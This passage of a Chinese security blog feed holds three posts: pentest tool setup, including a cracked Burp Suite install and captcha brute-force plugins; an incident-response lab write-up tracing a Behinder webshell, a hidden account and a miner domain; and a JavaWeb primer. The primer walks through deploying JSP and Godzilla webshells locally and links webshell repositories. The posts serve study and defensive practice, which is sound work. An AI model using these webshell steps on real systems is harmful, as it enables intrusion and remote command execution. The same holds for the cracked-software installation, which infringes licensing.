alt="image-20240618104935039"></p><p>对端口及一些可能的漏洞进行扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049846.png" alt="image-20240618104945825"></p><p>扫描使用了什么组件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181050051.png" alt="image-20240618105001015"></p><p>功能较多</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181050016.png" alt="image-20240618105012977"></p><p>微步的威胁检测</p><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p>在软件安装之前记得要先配置jdk环境</p><p><a href="https://www.oracle.com/cn/java/technologies/downloads/">Java Downloads | Oracle 中国</a></p><p>这里不展开讲了哈</p><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><p><a href="https://www.52pojie.cn/thread-1544866-1-1.html">BurpSuite v2024.5.1汉化无cmd框版（2024.06.09更新） - 『逆向资源区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p>打开网址下载最新版本即可</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170252967.png" alt="image-20240617025156894"></p><p>解压到文件夹可以看到这些，如果之前安装过burp的可以先点击一下清楚许可证和数据,点开文件夹中的Start.VBS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170255605.png" alt="image-20240617025528568"></p><p>全部勾选之后点击run就会自动运行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170255011.png" alt="image-20240617025555988"></p><p>输入上一张图中的license</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170256167.png" alt="image-20240617025656097"></p><p>然后点击继续</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170257756.png" alt="image-20240617025731727"></p><p>选择手动激活</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170258448.png" alt="image-20240617025811392"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170258571.png" alt="image-20240617025847507"></p><p>然后点击继续即可</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170259978.png" alt="image-20240617025907953"></p><p>到此软件安装完成</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170300379.png" alt="image-20240617030051344"></p><p>一般来说我们到这里选择临时文件继续即可</p><h3 id="默认设置"><a href="#默认设置" class="headerlink" title="默认设置"></a>默认设置</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170302402.png" alt="image-20240617030207320"></p><p>打开软件长这样，我们基本上最常用的就是代理(proxy),Intruder(网上翻译叫侵入者),重放器(Repeater)，这里我们先着重看看代理，burp作为一款抓取数据包的工具，调好代理尤其重要</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170306053.png" alt="image-20240617030629013"></p><p>刚打开软件它就是空的，什么都没有，这是因为我们还没有打开浏览器（或者我们的网页没有走burp抓取的端口），这里我们要做两件事</p><h4 id="1-配置代理"><a href="#1-配置代理" class="headerlink" title="1:配置代理"></a>1:配置代理</h4><h4 id="2-下载证书"><a href="#2-下载证书" class="headerlink" title="2:下载证书"></a>2:下载证书</h4><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181952849.png" alt="image-20240618195216820"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181952114.png" alt="image-20240618195257084"></p><p>如果不喜欢8080可以点上面那个添加换上自己喜欢的端口，但那个不是本次重点，我们要导出证书</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181954426.png" alt="image-20240618195440393"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181957662.png" alt="image-20240618195712592"></p><p>先随便找个地方存着，名字叫什么无所谓，但一定要有der的后缀</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181958069.png" alt="image-20240618195808029"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181958362.png" alt="image-20240618195843322"></p><p>然后就是打开浏览器</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181959236.png" alt="image-20240618195930184"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181959754.png" alt="image-20240618195955694"></p><p>直接搜索证书，可以看到安全那里弹窗了，点进去</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182000375.png" alt="image-20240618200035257"></p><p>往下滑可以看到管理证书，点进去</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182001124.png" alt="image-20240618200143062"></p><p>点击导入</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182002168.png" alt="image-20240618200228099"></p><p>下一步</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182002785.png" alt="image-20240618200245723"></p><p>浏览</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182003861.png" alt="image-20240618200327788"></p><p>先点击右下角，然后就能看到我们的证书</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182004320.png" alt="image-20240618200403543"></p><p>选自动选择然后下一步即可</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182004024.png" alt="image-20240618200436985"></p><h4 id="3-其它配置"><a href="#3-其它配置" class="headerlink" title="3.其它配置"></a>3.其它配置</h4><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181946975.png" alt="image-20240618194608816"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181946349.png" alt="image-20240618194623318"></p><p>这里建议一定要把字体改一下，这里我建议改这个哈（不然的话很容易光标错位，用起来很难受）</p><h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><h5 id="Jython环境安装"><a href="#Jython环境安装" class="headerlink" title="Jython环境安装"></a>Jython环境安装</h5><p>在bp中我们有些插件是由python编写的，但是由于bp是基础java开发，所以我们在装python插件前，需要先装上jython环境</p><p><a href="https://www.jython.org/download.html">Downloads | Jython</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191639528.png" alt="image-20240619163905348"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191643789.png" alt="image-20240619164324768"></p><p>下完长这样，我们不用点他，打开我们的bp</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191648009.png" alt="image-20240619164845942"></p><p>点击选择文件选到我们下载好的jar包</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191650484.png" alt="image-20240619165011454"></p><p>到这里为止基础环境大体完成，由于插件很多，我不一一演示怎么安装，这里就推荐几个插件，以及我认为可能会存在问题的地方</p><p><a href="https://github.com/smxiazi/xia_Yue">smxiazi&#x2F;xia_Yue: burp 插件 xia_Yue（瞎越） 主要用于测试越权、未授权 (github.com)</a></p><p><a href="https://github.com/f0ng/captcha-killer-modified">f0ng&#x2F;captcha-killer-modified: captcha-killer的修改版，支持关键词识别base64编码的图片，添加免费ocr库，用于验证码爆破，适配新版Burpsuite (github.com)</a></p><p>爆破验证码还要配合打开</p><p><a href="https://github.com/f0ng/captcha-killer-modified/blob/main/codereg.py">captcha-killer-modified&#x2F;codereg.py at main · f0ng&#x2F;captcha-killer-modified (github.com)</a></p><p><a href="https://github.com/smxiazi/xia_Liao/releases">Releases · smxiazi&#x2F;xia_Liao (github.com)</a></p><p>伪造身份</p><h2 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h2><h2 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h2><p><a href="https://www.yaklang.io/products/intro/">Yakit: 集成化单兵安全能力平台 | Yak Program Language (yaklang.io)</a></p><h2 id="proxifirer"><a href="#proxifirer" class="headerlink" title="proxifirer"></a>proxifirer</h2><p><a href="https://blog.zgsec.cn/archives/278.html">渗透必备：使用Proxifier玩转代理 - AabyssZG’s Blog (zgsec.cn)</a></p><p>直接看这个</p><h2 id="Utools"><a href="#Utools" class="headerlink" title="Utools"></a>Utools</h2><p><a href="https://u.tools/">uTools官网 - 新一代效率工具平台</a></p>]]></content>
    
    
    <categories>
      
      <category>挖洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>挖洞</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>知攻善防-应急响应-web-1</title>
    <link href="/2024/06/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94web-1/"/>
    <url>/2024/06/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94web-1/</url>
    
    <content type="html"><![CDATA[<h1 id="知攻善防-应急响应-web-1"><a href="#知攻善防-应急响应-web-1" class="headerlink" title="知攻善防-应急响应-web-1"></a>知攻善防-应急响应-web-1</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210651.png" alt="image-20240323190457439"></p><p>打开如图</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210522.png"></p><p>本次任务如上</p><p>因为可以看到桌面只有三个图标，我们先看看回收站</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210577.png" alt="image-20240323192240460"></p><p>再看看phpstudy</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210540.png" alt="image-20240323190722914"></p><p>可以看到有一个网站，具体目录如上，再看题目是看攻击者shell密码，这里应该是被种了个后门木马</p><p>打开网站看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210434.png" alt="image-20240323193007178"></p><p>我们把D盾导入</p><p>并进行扫描，扫描的时候发现win自带的安全中心弹消息，发现他直接把shell给删了（D盾直接什么都没扫到）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210109.png" alt="image-20240323192743660"></p><p>这里为了不影响我们后续操作，先复原回去，并把安全中心关了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210404.png" alt="image-20240323192848757"></p><p>可以看到默认连接密码rebeyond，也就是冰蝎</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211600.png" alt="image-20240323193329845"></p><p>第一题答案</p><p>然后是要找攻击者ip，一般在日志中找，我们打开apache日志文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211219.png" alt="image-20240323193516628"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211655.png" alt="image-20240323193703186"></p><p>这里我们挑选文件大小比较大的这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161213266.png" alt="image-20240323193615103"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211315.png" alt="image-20240323193732211"></p><p>第二题也解出来了</p><p>第三题问隐藏账户名称，我们首先查看电脑上有哪些用户</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211278.png" alt="image-20240323194419342"></p><p>这里直接可以看到一个hack168$</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211808.png" alt="image-20240323194450750"></p><p>(也可以用日志分析工具，看注册表，计算机管理等方法)</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211813.png" alt="image-20240323194831453"></p><p>HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users&#x2F;Names</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211126.png" alt="image-20240323194802642"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161213631.png" alt="image-20240323194919646"></p><p>第四题找矿池域名</p><p>我们在刚才文件管理处找找有没有痕迹</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211112.png" alt="image-20240323195515041"></p><p>可以看到有个很像是挖矿工具的文件</p><p>这里我们直接丢到奇安信的情报沙箱进行分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211089.png" alt="image-20240323200639804"></p><p>（找了很久没找到域名，只有一个ip）</p><p>于是我们进行python反编译</p><p><a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor (github.com)</a></p><p>用到这个工具</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211847.png" alt="image-20240323202214146"></p><p>再到反编译出的文件中找到这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211507.png" alt="image-20240323202325249"></p><p><a href="https://www.toolkk.com/tools/pyc-decomplie">pyc反编译 - 工具匠 (toolkk.com)</a></p><p>在这个网站进行反编译之后可以看到如下：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211760.png" alt="image-20240323202607227"></p><p>wakuang.zhigongshanfang.top</p><p>最后的答案</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211786.png" alt=" "></p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB入门</title>
    <link href="/2024/06/16/JavaWeb/"/>
    <url>/2024/06/16/JavaWeb/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWEB"><a href="#JavaWEB" class="headerlink" title="JavaWEB"></a>JavaWEB</h1><p>指由Java语言开发出来可以在万维网上访问浏览的程序</p><p>WEB包括：WEB服务端和WEB客户端</p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>运行在Web服务器或应用服务器上的程序，作为来自Web浏览器或其它HTTP客户端的请求</p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>从创建到毁灭</p><p>1.init():初始化，只调用一次</p><p>2.service()</p><p><strong>3.doGet(),doPost()</strong></p><p>4.destroy()</p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p><a href="https://blog.csdn.net/weixin_51367845/article/details/124325311?ops_request_misc=%7B%22request_id%22:%22171290579216800182783781%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171290579216800182783781&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-124325311-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=servlet&spm=1018.2226.3001.4187">【Servlet】Servlet 详解（使用+原理）-CSDN博客</a></p><p>建议看这个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Hui4401/</span>StudentManager<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/czwbig/</span>Tmall_JavaEE<br></code></pre></td></tr></table></figure><p>然后可以拿这两个分析下</p><h2 id="过滤器、监听器和拦截器"><a href="#过滤器、监听器和拦截器" class="headerlink" title="过滤器、监听器和拦截器"></a>过滤器、监听器和拦截器</h2><p>**过滤器(Filter)**：用于过滤字符编码，做一些统一的业务等等。</p><p>通过<strong>javax.servlet.Filter</strong>接口进行实现</p><p>通常用于防止XSS,SQL注入，任意文件上传等</p><p>**监听器(Listener)**：做一些初始化的内容</p><p>使用<strong>javax.servlet.ServletContextListener</strong>接口实现</p><p>如果同时有监听器和过滤器，监听器在过滤器之前启动</p><p>**拦截器(Interceptor)**：依赖WEB框架</p><p>过滤器和拦截器的区别，分为以下五种：</p><ul><li>拦截器是基于 Java 的反射机制的，而过滤器是基于函数回调</li><li>过滤器依赖与 servlet 容器，而拦截器不依赖与 servlet 容器</li><li>拦截器只能对 action 请求起作用，而过滤器则可以对几乎所有的请求起作用</li><li>拦截器可以访问 action 上下文、值栈里的对象，而过滤器不能</li><li>在 action 的生命周期中，拦截器可以多次被调用，而过滤器只能在容器初始化时被调用一次</li></ul><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>Java Server Page</p><p>一种动态网页技术</p><p>它使用JSP标签在HTML网页中插入java代码</p><p>标签通常以&lt;% code %&gt;显示</p><p>JSP本质是简化版的servlet</p><p>JVM只能识别Java的类，无法识别JSP代码</p><p>JSP常用于动态页面显示，Servlet常用于逻辑控制。</p><p>JSP做前端动态页面，在接收到用户输入后交给对应Servlet进行处理（JSP也可以当作后端代码进行逻辑控制）</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>后缀名：.jsp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;%</span><br><span class="hljs-section">out.println(<span class="hljs-string">&quot;jsp&quot;</span>)</span><br><span class="hljs-section">%&gt;</span><br><br><span class="hljs-section">&lt;jsp:scriptlet&gt;</span><br><span class="hljs-attribute">code</span><br><span class="hljs-section">&lt;/jsp:scriptlet&gt;</span><br></code></pre></td></tr></table></figure><p>生命周期:<strong>编译</strong>-&gt;初始化-&gt;执行-&gt;销毁</p><p>编译：JSP-&gt;servlet</p><p>三步:解析JSP文件-&gt;将JSP文件转为Servlet-&gt;编译Servlet</p><p>JSP指令:设置JSP整个页面属性的。格式为:&lt;%@ directive attribute&#x3D;”value” %&gt;。</p><p>常见指令:</p><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>&lt;%@ page…%&gt;</td><td>定义网页依赖属性</td></tr><tr><td>&lt;%@ include %&gt;</td><td>包含其他文件</td></tr><tr><td>&lt;%@ taglib %&gt;</td><td>引入标签库定义</td></tr></tbody></table><p>内置对象</p><p>（隐式对象），这九个对象，可以不用声明直接使用。</p><table><thead><tr><th><strong>名称</strong></th><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>out</td><td>javax.Servlet.jsp.JspWriter</td><td>页面输出</td></tr><tr><td>request</td><td>javax.Servlet.http.HttpServletRequest</td><td>获得用户请求</td></tr><tr><td>response</td><td>javax.Servlet.http.HttpServletResponse</td><td>服务器向客户端的回应信息</td></tr><tr><td>config</td><td>javax.Servlet.ServletConfig</td><td>服务器配置，可以取得初始化参数</td></tr><tr><td>session</td><td>javax.Servlet.http.HttpSession</td><td>保存用户的信息</td></tr><tr><td>application</td><td>javax.Servlet.ServletContext</td><td>所有用户的共享信息</td></tr><tr><td>page</td><td>java.lang.Object</td><td>指当前页面转换后的Servlet类的实例</td></tr><tr><td>pageContext</td><td>javax.Servlet.jsp.PageContext</td><td>JSP的页面容器</td></tr><tr><td>exception</td><td>java.lang.Throwable</td><td>表示JSP页面所发生的异常，在错误页中才起作用</td></tr></tbody></table><h2 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h2><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><p>前几年是 JSP 木马的鼎盛时期，由于技术的迭代。现在大型企业使用 SprinBoot 框架来开发的系统了，该框架默认是不引入 JSP 解析的，需要引入特定依赖才可以。</p><p>而且现在前端大多使用vue，thymeleaf，freemarker等等。因此JSP木马也算逐渐没落了。</p><p>但我们还是得学习了解，毕竟网站数量基数很大，难免会在授权的测试中遇见。</p><p>JSP木马也可以称作JSP Webshell，如果对方在上传文件或其他功能没有做防护的话，攻击者可以利用任意文件上传漏洞将恶意代码传到后端，继而攻击者可以达到操作目标网站的目的。</p><p>切勿对未授权的系统进行非法测试，这是违法行为。</p><p>推荐一些较为老派的 JSP 木马的 github 仓库：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/theralfbrown/</span>WebShell-<span class="hljs-number">2</span><span class="hljs-regexp">/tree/m</span>aster/jsp<br></code></pre></td></tr></table></figure><p>近两年主流 webshell 管理工具：冰蝎，哥斯拉，蚁剑……</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">冰蝎：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebeyond/</span>Behinder<br>蚁剑：https:<span class="hljs-regexp">//gi</span>thub.com/AntSwordProject<br>哥斯拉：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<br></code></pre></td></tr></table></figure><h3 id="1、JSP-大马"><a href="#1、JSP-大马" class="headerlink" title="1、JSP 大马"></a>1、JSP 大马</h3><p>JSP 大马，在代码中写入了更多功能，可以实现在网页中进行一些危险操作。</p><p>以下演示案例中的JSP大马用的是<code>https://github.com/theralfbrown/WebShell-2/tree/master/jsp</code>这个仓库中<code>无密码的jsp大马.jsp</code>。</p><p>①、在webapp下新建个<code>shell.jsp</code>，在该文件中复制粘贴以上代码。如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151556180.jpg" alt="JSP大马"></p><p>②、点击运行，；浏览器访问<code>127.0.0.1:8080/shell.jsp</code>，从中可以看到，我们可以进行的危险操作有上传文件、执行命令等等，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151556069.jpg" alt="大马执行ping命令"></p><p>建议各位动手操作吧，动手操作加深理解。</p><p>感兴趣的可以自己私下阅读学习源码。</p><h3 id="2、Godzilla（哥斯拉）JSP木马操作"><a href="#2、Godzilla（哥斯拉）JSP木马操作" class="headerlink" title="2、Godzilla（哥斯拉）JSP木马操作"></a>2、Godzilla（哥斯拉）JSP木马操作</h3><p>Godzilla（哥斯拉），主要用于管理Webshell的客户端工具。近两年比较主流的工具。哥斯拉内置了 3 种 Payload 以及 6 种加密器,6 种支持脚本后缀，20 个内置插件。</p><p>Github地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<br></code></pre></td></tr></table></figure><p>下载地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<span class="hljs-regexp">/releases/</span>tag/v4.<span class="hljs-number">0.1</span>-godzilla<br></code></pre></td></tr></table></figure><p>下面我们在代码文件中再新建一个名为<code>shell1.jsp</code>文件，配合哥斯拉的JSP木马进行操作。</p><p>①、下载完成后，启动哥斯拉，点击左上角管理，选择生成，此步骤是为了生成JSP木马代码，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557129.jpg" alt="哥斯拉生成木马"></p><p>然后点击生成，suffix 选择为 JSP，点击确定后选择存放目录。</p><p>②、将已生成的代码复制粘贴到<code>shell1.jsp</code>中，然后启动项目。如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557788.jpg" alt="复制粘贴到shell1jsp中"></p><p>③、打开哥斯拉，点击左上角目标，选择添加，将shell1.jsp地址添加进去后点击添加，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557891.jpg" alt="添加目标"></p><p>④、点击添加后，在管理页面即可看到该链接，右键选择进入，成功进入webshell管理页面，剩下的自己研究下吧。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557943.jpg" alt="shell执行whoami"></p><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p><a href="https://spring.io/">Spring | Home</a></p><p>开源框架，用于构建企业级java应用程序</p><p>核心特点：</p><p><strong>轻量级</strong></p><p><strong>控制反转</strong></p><p><strong>面向切面编程</strong></p><p><strong>容器</strong></p><p><strong>数据访问</strong></p><p><strong>事务管理</strong></p><p><strong>模块化</strong></p><p>Spring是一个java开源框架接口，是一个生态体系</p><p>核心框架为Spring Framework</p><p>在这基础上衍生出Spring Boot、Spring Cloud、Spring Data、Spring Security等</p><h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>Spring基础上的一个MVC框架，基于模型-视图-控制器（model-view-controller)设计模式进行javaweb系统的开发，它是Spring的一个模块，通过Dispatcher Servlet,ModelAndView和View Resolver等</p><p>想用SpringMVC必须先依赖Spring</p><h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC是一种软件框架模式，被广泛应用再JavaEE项目开发中、MVC模式通过提供一种良好的组织结构和分工方式，帮助解决了软件开发中的耦合、可维护性、可测试性和可扩展性等方面的问题。</p><p>MVC</p><p>M</p><p>模型是用于处理数据逻辑的部分</p><p>所谓数据逻辑，也就是数据的映射以及对数据的增删改查，Bean、DAO(数据访问对象)等都属于模型部分</p><p>V</p><p>视图负责数据与其它信息的显示，也就是给用户看到的页面</p><p>html、JSP等页面都可以作为视图‘</p><p>C</p><p>控制器是模型与视图之间的桥梁，控制着数据与用户的交互。</p><p>控制器通常负责从视图读取数据，处理用户输入，并向模型发送数据，也可以从模型中读取数据，再发送给视图，由视图显示</p><h2 id="核心架构流程"><a href="#核心架构流程" class="headerlink" title="核心架构流程"></a>核心架构流程</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151557075.png" alt="spring-springframework-mvc-5"></p><p>在 Spring MVC 框架中，<code>DispatcherServlet</code>、<code>HandlerMapping</code> 和 <code>HandlerAdapter</code> 是三个重要的组件，它们各自承担不同的角色，协同工作以处理客户端的请求并调度相应的处理程序。以下是它们的解释和作用：</p><p><strong>DispatcherServlet（调度器Servlet）：</strong></p><ul><li><strong>作用：</strong> <code>DispatcherServlet</code> 是 Spring MVC 中的前端控制器（Front Controller），负责接收客户端的所有请求并将其分派给适当的处理程序（Controller）。</li><li><strong>解释：</strong> 当客户端发送请求时，<code>DispatcherServlet</code> 接收请求，然后根据配置和规则找到合适的 <code>HandlerMapping</code> 来确定请求对应的处理程序。一旦找到处理程序，<code>DispatcherServlet</code> 将请求交给该处理程序进行处理。它还负责处理异常、视图解析和其他与请求生命周期相关的任务。</li><li><strong>源代码路径：</strong></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/spring-projects/</span>spring-framework<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/spring-webmvc/</span>src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/org/</span>springframework<span class="hljs-regexp">/web/</span>servlet/DispatcherServlet.java<br></code></pre></td></tr></table></figure><p><strong>HandlerMapping（处理程序映射）：</strong></p><ul><li><strong>作用：</strong> <code>HandlerMapping</code> 负责将请求映射到相应的处理程序（Controller）。它确定了客户端请求应该由哪个处理程序来处理。</li><li><strong>解释：</strong> 在 Spring MVC 中，可以有多个 <code>HandlerMapping</code> 实现，包括基于注解的映射、基于路径的映射等。<code>HandlerMapping</code> 将请求的 URL 映射到具体的控制器类和方法，以便 <code>DispatcherServlet</code> 可以将请求分发给正确的处理程序。</li><li><strong>源代码路径：</strong></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/spring-projects/</span>spring-framework<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/spring-webmvc/</span>src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/org/</span>springframework<span class="hljs-regexp">/web/</span>servlet/HandlerMapping.java<br></code></pre></td></tr></table></figure><p><strong>HandlerAdapter（处理程序适配器）：</strong></p><ul><li><strong>作用：</strong> <code>HandlerAdapter</code> 负责调用实际的处理程序（Controller）来处理请求，并将处理程序的执行结果返回给 <code>DispatcherServlet</code>。</li><li><strong>解释：</strong> 不同的处理程序可能有不同的接口，<code>HandlerAdapter</code> 的作用是适配各种不同类型的处理程序，使得它们能够被 <code>DispatcherServlet</code> 统一调用。它将请求传递给处理程序，处理程序执行后，<code>HandlerAdapter</code> 还负责处理返回的结果，如视图解析、数据绑定等。</li><li><strong>源代码路径：</strong></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/spring-projects/</span>spring-framework<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/spring-webmvc/</span>src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/org/</span>springframework<span 